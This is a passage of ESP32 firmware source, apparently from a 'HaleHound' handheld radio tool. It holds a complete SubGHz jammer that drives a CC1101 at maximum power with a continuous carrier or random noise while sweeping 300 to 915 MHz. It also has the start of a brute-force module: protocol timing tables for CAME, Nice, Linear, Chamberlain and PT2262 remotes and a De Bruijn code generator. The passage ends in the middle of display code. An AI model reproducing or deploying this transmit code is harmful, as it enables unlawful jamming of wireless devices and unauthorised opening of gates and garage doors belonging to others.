    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.printf("Jam: %s", continuousMode ? "CARRIER" : "NOISE");

    tft.setCursor(SCALE_X(140), SCALE_Y(82));
    tft.printf("Sweep: %s", autoSweep ? "AUTO" : "OFF");

    tft.drawLine(0, SCALE_Y(92), SCREEN_WIDTH, SCALE_Y(92), HALEHOUND_HOTPINK);
}

// Forward declaration
static void drawFreqMarkers();

// Update channel heat levels - INSANE EQUALIZER MODE (85 bars!)
// Matches WLAN Jammer heat logic exactly
static void updateChannelHeat() {
    int currentBar = SJ_FREQ_TO_BAR(currentFreqIndex);

    if (!jamming) {
        // Decay all channels when not jamming
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            if (channelHeat[i] > 0) {
                channelHeat[i] = channelHeat[i] / 2;  // Fast decay when stopped
            }
        }
        return;
    }

    if (autoSweep) {
        // AUTO SWEEP MODE - INSANE EQUALIZER
        // All bars dance because we're jamming EVERYTHING
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            int dist = abs(i - currentBar);

            if (i == currentBar) {
                // Direct hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (dist <= 6) {
                // Splash zone - strong heat with falloff
                int splash = 110 - (dist * 12);
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background chaos - all bars dance randomly
                // Base 50-80 with random variation = visible activity everywhere
                int chaos = 50 + random(40);
                channelHeat[i] = (channelHeat[i] + chaos) / 2;
            }
        }
    } else {
        // SINGLE FREQUENCY MODE - focused attack
        // Target bar gets 5-bar cluster (like WiFi channel width)
        int startBar = currentBar - 2;
        int endBar = currentBar + 2;
        if (startBar < 0) startBar = 0;
        if (endBar >= SJ_NUM_BARS) endBar = SJ_NUM_BARS - 1;

        for (int i = 0; i < SJ_NUM_BARS; i++) {
            bool isTargeted = (i >= startBar && i <= endBar);
            bool isCurrentBar = (i == currentBar);

            if (isCurrentBar) {
                // Currently being hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (isTargeted) {
                // In target range - keep warm with variation
                int baseHeat = 50 + random(30);
                int dist = abs(i - currentBar);
                int neighborBoost = (dist <= 2) ? (30 - dist * 10) : 0;
                int targetHeat = baseHeat + neighborBoost;
                channelHeat[i] = (channelHeat[i] + targetHeat) / 2;
            } else {
                // Not targeted - decay
                if (channelHeat[i] > 0) {
                    channelHeat[i] = (channelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

static bool sjStandbyDrawn = false;

static void drawJammerDisplay() {
    // Update heat levels first
    updateChannelHeat();

    int maxBarH = SJ_GRAPH_HEIGHT - 25;

    if (!jamming) {
        // Check if any heat remains (for decay animation)
        bool hasHeat = false;
        for (int i = 0; i < SJ_NUM_BARS; i++) {
            if (channelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            if (sjStandbyDrawn) return;

            tft.fillRect(SJ_GRAPH_X, SJ_GRAPH_Y, SJ_GRAPH_WIDTH, SJ_GRAPH_HEIGHT, TFT_BLACK);
            tft.drawRect(SJ_GRAPH_X - 1, SJ_GRAPH_Y - 1, SJ_GRAPH_WIDTH + 2, SJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

            for (int i = 0; i < SJ_NUM_BARS; i++) {
                int x = SJ_GRAPH_X + (i * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
                int barH = 8 + (i % 5) * 2;
                int barY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - barH - 10;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(SJ_GRAPH_X + 85, SJ_GRAPH_Y + 5);
            tft.print("STANDBY");

            drawFreqMarkers();
            sjStandbyDrawn = true;
            return;
        }
    }

    // Active or decaying — clear and redraw
    sjStandbyDrawn = false;

    tft.fillRect(SJ_GRAPH_X, SJ_GRAPH_Y, SJ_GRAPH_WIDTH, SJ_GRAPH_HEIGHT, TFT_BLACK);
    tft.drawRect(SJ_GRAPH_X - 1, SJ_GRAPH_Y - 1, SJ_GRAPH_WIDTH + 2, SJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    // ═══════════════════════════════════════════════════════════════════════
    // DRAW THE EQUALIZER - 85 skinny bars of FIRE!
    // ═══════════════════════════════════════════════════════════════════════
    for (int i = 0; i < SJ_NUM_BARS; i++) {
        int x = SJ_GRAPH_X + (i * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
        uint8_t heat = channelHeat[i];

        // Bar height based on heat - MORE AGGRESSIVE scaling
        int barH = (heat * maxBarH) / 100;  // Taller bars!
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 8) barH = 8;  // Higher minimum

        int barY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - barH - 8;

        // Color based on heat - vibrant gradient from cyan to hot pink
        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;

            // More aggressive color gradient
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan (0, 207, 255) -> Hot Pink (255, 28, 82)
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Add glow effect at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // Frequency markers
    drawFreqMarkers();

    // Current frequency display
    if (jamming) {
        tft.fillRect(SJ_GRAPH_X + 50, SJ_GRAPH_Y + 2, 140, 12, TFT_BLACK);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(SJ_GRAPH_X + 55, SJ_GRAPH_Y + 3);
        tft.printf(">>> %.3f MHz <<<", frequencyListMHz[currentFreqIndex]);
    }
}

// Draw frequency markers below the equalizer bars
static void drawFreqMarkers() {
    int markerY = SJ_GRAPH_Y + SJ_GRAPH_HEIGHT - 8;

    // Map freq indices to bar positions: barIdx = freqIdx * 85 / 17
    // idx 0 = 300MHz (bar 0), idx 10 = 433MHz (bar 50), idx 14 = 868MHz (bar 70), idx 15 = 915MHz (bar 75)
    int x300 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(0) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x433 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(10) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x868 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(14) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);
    int x915 = SJ_GRAPH_X + (SJ_FREQ_TO_BAR(15) * SJ_GRAPH_WIDTH / SJ_NUM_BARS);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x300 - 2, markerY);
    tft.print("300");
    tft.setCursor(x433 - 2, markerY);
    tft.print("433");
    tft.setCursor(x868 - 4, markerY);
    tft.print("868");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x915 - 4, markerY);
    tft.print("915");
}

// Draw skull rows with animated wave - 3 rows of 8 = 24 skulls!
// Active frequency skull turns RED, adjacent skulls glow orange
static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = SCALE_X(28);

    // Map current frequency index to skull position (0-7)
    // 17 frequencies spread across 8 skulls
    int activeSkull = currentFreqIndex * SJ_SKULL_NUM / frequencyCount;
    if (activeSkull >= SJ_SKULL_NUM) activeSkull = SJ_SKULL_NUM - 1;

    for (int row = 0; row < SJ_SKULL_ROWS; row++) {
        int rowY = SJ_SKULL_Y + (row * SJ_SKULL_ROW_SPACING);

        for (int i = 0; i < SJ_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (jamming) {
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE FREQUENCY SKULL - PULSING BRIGHT RED
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);  // 180-255 pulse
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS - ORANGE/RED GLOW (frequency neighbors)
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave for distant skulls
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        uint8_t r = (uint8_t)(ratio * 255);
                        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, sjSkulls[i], 16, 16, color);
        }

        // Status text next to skulls on first row only
        if (row == 0) {
            tft.fillRect(skullStartX + (SJ_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (SJ_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(jamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 JAM TASK — CC1101 TX engine (frequency sweep + jam signal)
// Core 0 owns ALL CC1101 SPI access while jamming is active
// ═══════════════════════════════════════════════════════════════════════════

static void sjJamTask(void* param) {
    sjTaskRunning = true;
    unsigned long sweepTime = millis();

    while (jamming) {
        // Check if Core 1 requested a frequency change
        if (freqChanged) {
            ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
            cc1101PaSetTx();
            freqChanged = false;
        }

        // Auto-sweep frequency hopping
        if (autoSweep && millis() - sweepTime >= SWEEP_INTERVAL_MS) {
            currentFreqIndex = (currentFreqIndex + 1) % frequencyCount;
            ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
            cc1101PaSetTx();
            sweepTime = millis();
            lastSweepTime = sweepTime;  // Expose for display
        }

        // Transmit jam signal
        if (continuousMode) {
            // Continuous carrier - hold TX
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, 0xFF);
            ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
            digitalWrite(CC1101_GDO0, HIGH);
        } else {
            // Noise mode - random pulses
            for (int i = 0; i < 10; i++) {
                uint32_t noise = random(16777216);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise >> 16);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, (noise >> 8) & 0xFF);
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise & 0xFF);
                ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
                delayMicroseconds(50);
            }
        }

        vTaskDelay(1);  // Yield to watchdog
    }

    sjTaskRunning = false;
    vTaskDelete(NULL);
}

static void startJamTask() {
    if (sjTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(sjJamTask, "subJam", 4096, NULL, 1, &sjTaskHandle, 0);
}

static void stopJamTask() {
    jamming = false;
    if (sjTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (sjTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (sjTaskRunning) {
        vTaskDelete(sjTaskHandle);
    }

    sjTaskHandle = NULL;
    sjTaskRunning = false;
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    exitRequested = false;
    jamming = false;
    skullFrame = 0;
    freqChanged = false;
    sjTaskHandle = NULL;
    sjTaskRunning = false;
    memset(channelHeat, 0, sizeof(channelHeat));

    #if CYD_DEBUG
    Serial.println("[JAMMER] Initializing SubGHz Jammer...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Safe check — ELECHOUSE has blocking MISO loops that freeze with no CC1101
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[JAMMER] CC1101 not detected (safe check)");
        #endif
        return;
    }

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);
    #ifdef NMRF_HAT
    pinMode(CC1101_GDO0, OUTPUT);  // Hat: GDO_Set() leaves as INPUT when GDO0==GDO2
    #endif

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK
        ELECHOUSE_cc1101.setRxBW(500.0);
        ELECHOUSE_cc1101.setPA(12);         // Max power
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);

        #if CYD_DEBUG
        Serial.println("[JAMMER] CC1101 initialized");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[JAMMER] CC1101 not found!");
        #endif
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "CC1101 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, "CS=27 GDO0=22 GDO2=35", HALEHOUND_MAGENTA, 1);
        initialized = false;
        return;
    }

    // Draw full UI
    drawHeader();
    drawJammerDisplay();
    drawSkulls();

    lastDisplayTime = millis();
    initialized = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) {
        // CC1101 not found - just check for exit
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Touch zones reference sjIconX[] so they scale with screen size
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Wait for touch release to prevent repeated triggers
            waitForTouchRelease();

            // Back icon (sjIconX[0])
            if (tx >= (sjIconX[0] - 5) && tx <= (sjIconX[0] + 20)) {
                if (jamming) stop();
                exitRequested = true;
                return;
            }
            // Toggle/Start icon (sjIconX[1])
            else if (tx >= (sjIconX[1] - 10) && tx <= (sjIconX[1] + 20)) {
                toggle();
                drawIconBar();
                drawHeader();
                return;
            }
            // Prev freq icon (sjIconX[2])
            else if (tx >= (sjIconX[2] - 10) && tx <= (sjIconX[2] + 20)) {
                if (!autoSweep) {
                    prevFrequency();
                    drawHeader();
                }
                return;
            }
            // Next freq icon (sjIconX[3])
            else if (tx >= (sjIconX[3] - 10) && tx <= (sjIconX[3] + 20)) {
                if (!autoSweep) {
                    nextFrequency();
                    drawHeader();
                }
                return;
            }
            // Sweep icon (sjIconX[4])
            else if (tx >= (sjIconX[4] - 10) && tx <= (sjIconX[4] + 20)) {
                toggleAutoSweep();
                drawIconBar();
                drawHeader();
                return;
            }
            // Mode icon (sjIconX[5])
            else if (tx >= (sjIconX[5] - 10) && tx <= (sjIconX[5] + 20)) {
                toggleContinuousMode();
                drawHeader();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jamming) stop();
        exitRequested = true;
        return;
    }

    // Jam engine runs on Core 0 (sjJamTask)
    // Frequency sweep + TX all handled by Core 0

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (throttled at ~12fps for smooth equalizer animation)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayTime >= 80) {
        drawJammerDisplay();
        drawSkulls();
        lastDisplayTime = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// CONTROL FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void start() {
    if (!jamming) {
        // CC1101 init before task launch — sequential, no contention
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
        cc1101PaSetTx();
        lastSweepTime = millis();
        sjStandbyDrawn = false;
        jamming = true;

        startJamTask();  // Launch Core 0 TX engine

        #if CYD_DEBUG
        Serial.printf("[JAMMER] Started on %.3f MHz (Core 0)\n", frequencyListMHz[currentFreqIndex]);
        #endif
    }
}

void stop() {
    if (jamming) {
        stopJamTask();  // Kill Core 0 task first

        // CC1101 cleanup — task is dead, safe to access from Core 1
        cc1101PaSetIdle();
        digitalWrite(CC1101_GDO0, LOW);

        #if CYD_DEBUG
        Serial.println("[JAMMER] Stopped");
        #endif
    }
}

void toggle() {
    if (jamming) {
        stop();
    } else {
        start();
    }
}

bool isJamming() {
    return jamming;
}

void setFrequency(float mhz) {
    // Find closest frequency in list
    for (int i = 0; i < frequencyCount; i++) {
        if (abs(frequencyListMHz[i] - mhz) < 0.01) {
            currentFreqIndex = i;
            break;
        }
    }
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

float getFrequency() {
    return frequencyListMHz[currentFreqIndex];
}

void nextFrequency() {
    currentFreqIndex = (currentFreqIndex + 1) % frequencyCount;
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

void prevFrequency() {
    currentFreqIndex = (currentFreqIndex - 1 + frequencyCount) % frequencyCount;
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

void toggleAutoSweep() {
    autoSweep = !autoSweep;
    if (autoSweep) {
        lastSweepTime = millis();
    }

    #if CYD_DEBUG
    Serial.println("[JAMMER] Auto-sweep: " + String(autoSweep ? "ON" : "OFF"));
    #endif
}

bool isAutoSweep() {
    return autoSweep;
}

void toggleContinuousMode() {
    continuousMode = !continuousMode;

    #if CYD_DEBUG
    Serial.println("[JAMMER] Mode: " + String(continuousMode ? "Carrier" : "Noise"));
    #endif
}

bool isContinuousMode() {
    return continuousMode;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (jamming) {
        stop();  // Kills Core 0 task + CC1101 cleanup
    }
    stopJamTask();  // Belt and suspenders — ensure task is dead
    cc1101PaSetIdle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[JAMMER] Cleanup complete");
    #endif
}

}  // namespace SubJammer



// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ BRUTE FORCE IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace SubBrute {

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════
#define SB_ICON_SIZE 16
#define SB_ICON_NUM 5
static int sbIconX[SB_ICON_NUM] = {SCALE_X(50), SCALE_X(90), SCALE_X(130), SCALE_X(170), 10};
static const unsigned char* sbIcons[SB_ICON_NUM] = {
    bitmap_icon_power,             // 0: Start/Stop
    bitmap_icon_sort_down_minus,   // 1: Prev protocol
    bitmap_icon_sort_up_plus,      // 2: Next protocol
    bitmap_icon_random,            // 3: Toggle De Bruijn
    bitmap_icon_go_back            // 4: Back
};

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_DARK);
    for (int i = 0; i < SB_ICON_NUM; i++) {
        tft.drawBitmap(sbIconX[i], ICON_BAR_Y, sbIcons[i], SB_ICON_SIZE, SB_ICON_SIZE, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// PROTOCOL DEFINITIONS - 21 protocols covering ALL SubGHz frequencies
// 3 repetitions for stronger signal while maintaining touch responsiveness
// ═══════════════════════════════════════════════════════════════════════════
struct ProtocolDef {
    const char* name;
    uint32_t frequency;     // Hz
    uint8_t bitLength;
    uint16_t shortPulse;    // T
    uint16_t longPulse;     // 2T or 3T
    uint16_t pilotHigh;
    uint16_t pilotLow;
    uint16_t interCodeDelay;
    uint8_t repetitions;
};

// 1 rep for responsive touch - brute force sends ALL codes anyway
static const ProtocolDef protocols[PROTO_COUNT] = {
    // CAME 12-bit: T=320us
    {"CAME 433",   433920000, 12, 320, 640, 320, 9600, 100, 1},
    {"CAME 315",   315000000, 12, 320, 640, 320, 9600, 100, 1},
    // Nice FLO 12-bit: T=700us
    {"NICE 433",   433920000, 12, 700, 1400, 700, 25200, 100, 1},
    {"NICE 315",   315000000, 12, 700, 1400, 700, 25200, 100, 1},
    // Linear 10-bit: T=500us
    {"LINEAR 300", 300000000, 10, 500, 1000, 500, 18000, 100, 1},
    {"LINEAR 310", 310000000, 10, 500, 1000, 500, 18000, 100, 1},
    // Chamberlain 9-bit: T=500us
    {"CHAMBERLN",  300000000,  9, 500, 1500, 500, 39000, 100, 1},
    // PT2262/EV1527 12-bit: T=350us - covers ALL common frequencies
    {"PT2262 300", 300000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 303", 303875000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 304", 304250000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 310", 310000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 315", 315000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 318", 318000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 390", 390000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 418", 418000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 433", 433920000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 434", 434420000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 438", 438900000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 868", 868350000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 915", 915000000, 12, 350, 1050, 350, 10850, 100, 1}
};

// ═══════════════════════════════════════════════════════════════════════════
// SIMPLE TX INDICATOR - No complex animation, just shows activity
// ═══════════════════════════════════════════════════════════════════════════
#define EQ_Y            SCALE_Y(200)  // Where the TX indicator area starts

static unsigned long lastEqUpdate = 0;
static int txPulse = 0;

static void drawEqualizer() {
    // Simple TX activity bar at bottom
    tft.fillRect(10, EQ_Y, CONTENT_INNER_W, 20, HALEHOUND_BLACK);
    tft.drawRoundRect(10, EQ_Y, CONTENT_INNER_W, 20, 4, HALEHOUND_MAGENTA);

    if (txPulse > 0) {
        int barW = min(txPulse * 2, CONTENT_INNER_W - 4);
        for (int i = 0; i < barW; i++) {
            float ratio = (float)i / (float)(CONTENT_INNER_W - 4);
            // Inline gradient: cyan to hot pink
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 255 - (uint8_t)(ratio * (255 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 132));
            uint16_t color = tft.color565(r, g, b);
            tft.drawFastVLine(12 + i, EQ_Y + 2, 16, color);
        }
    }
}

static void updateEqualizer() {
    if (millis() - lastEqUpdate < 50) return;
    lastEqUpdate = millis();

    // Decay
    if (txPulse > 0) txPulse -= 5;
    if (txPulse < 0) txPulse = 0;

    drawEqualizer();
}

static void pulseEqualizer(int intensity) {
    txPulse = min(txPulse + intensity, 108);
}

// State variables
static bool initialized = false;
static bool exitRequested = false;
static bool running = false;
static bool paused = false;
static bool useDeBruijn = true;
static int currentProtocol = PROTO_CAME_433;
static uint32_t currentCode = 0;
static uint32_t startCode = 0;
static uint32_t endCode = 0;
static uint32_t deBruijnBit = 0;
static uint32_t deBruijnLength = 0;
static unsigned long startTime = 0;
static unsigned long lastDisplayUpdate = 0;
static unsigned long lastDebounce = 0;
#define DEBOUNCE_MS 200

// De Bruijn generator state
static uint8_t* deBruijnA = nullptr;
static int deBruijnN = 0;
static int deBruijnT = 0;
static int deBruijnP = 0;
static int deBruijnOutputIdx = 0;
static bool deBruijnHasMore = true;

// RCSwitch for transmission
static RCSwitch bruteSwitch;

// Initialize De Bruijn generator
static void initDeBruijn(int n) {
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnN = n;
    deBruijnA = new (std::nothrow) uint8_t[n + 1]();

    if (deBruijnA == nullptr) {
        deBruijnHasMore = false;
        return;
    }

    deBruijnT = 1;
    deBruijnP = 1;
    deBruijnOutputIdx = 1;
    deBruijnHasMore = true;
    deBruijnLength = (1UL << n);
    deBruijnBit = 0;
}

static void cleanupDeBruijn() {
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnHasMore = false;
}

static int nextDeBruijnBit() {
    while (deBruijnHasMore) {
        if (deBruijnT > deBruijnN) {
            if (deBruijnN % deBruijnP == 0) {
                if (deBruijnOutputIdx <= deBruijnP) {
                    return deBruijnA[deBruijnOutputIdx++];
                }
                deBruijnOutputIdx = 1;
            }
            do {
                deBruijnT--;
                if (deBruijnT == 0) {
                    deBruijnHasMore = false;
                    return -1;
                }
            } while (deBruijnA[deBruijnT] == 1);

            deBruijnA[deBruijnT]++;
            deBruijnP = deBruijnT;
            deBruijnT++;
        } else {
            deBruijnA[deBruijnT] = deBruijnA[deBruijnT - deBruijnP];
            deBruijnT++;
        }
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROTOKILL-STYLE UI - Big fonts, gradients, animated status
// ═══════════════════════════════════════════════════════════════════════════

// Helper to draw centered FreeFont text
static void drawCenteredFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Generate gradient color from cyan to hot pink
static uint16_t getGradientColor(float ratio) {
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 255 - (uint8_t)(ratio * (255 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 132));
    return tft.color565(r, g, b);
}

// Draw gradient progress bar
static void drawGradientProgressBar(int x, int y, int w, int h, float progress) {
    // Border
    tft.drawRoundRect(x - 1, y - 1, w + 2, h + 2, 3, HALEHOUND_MAGENTA);

    // Background
    tft.fillRoundRect(x, y, w, h, 2, HALEHOUND_DARK);

    // Fill with gradient
    int fillW = (int)(progress * w / 100.0);
    if (fillW > 0) {
        for (int i = 0; i < fillW; i++) {
            float ratio = (float)i / (float)w;
            uint16_t color = getGradientColor(ratio);
            tft.drawFastVLine(x + i, y + 1, h - 2, color);
        }
    }

    // Percentage text
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.setTextSize(1);
    char buf[8];
    snprintf(buf, sizeof(buf), "%.1f%%", progress);
    int tw = strlen(buf) * 6;
    tft.setCursor(x + (w - tw) / 2, y + (h - 8) / 2);
    tft.print(buf);
}

static void drawMainUI() {
    const ProtocolDef& proto = protocols[currentProtocol];

    // Clear main area (below icon bar, above equalizer)
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, EQ_Y - CONTENT_Y_START, TFT_BLACK);

    // Glitch title - chromatic aberration effect
    drawGlitchText(SCALE_Y(55), "BRUTE FORCE", &Nosifer_Regular10pt7b);
    tft.drawLine(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_Y(58), HALEHOUND_HOTPINK);

    // Protocol frame with rounded corners
    tft.drawRoundRect(10, SCALE_Y(60), CONTENT_INNER_W, SCALE_Y(55), 8, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, SCALE_Y(61), CONTENT_INNER_W - 2, SCALE_Y(53), 7, HALEHOUND_GUNMETAL);

    // Protocol name - big and centered
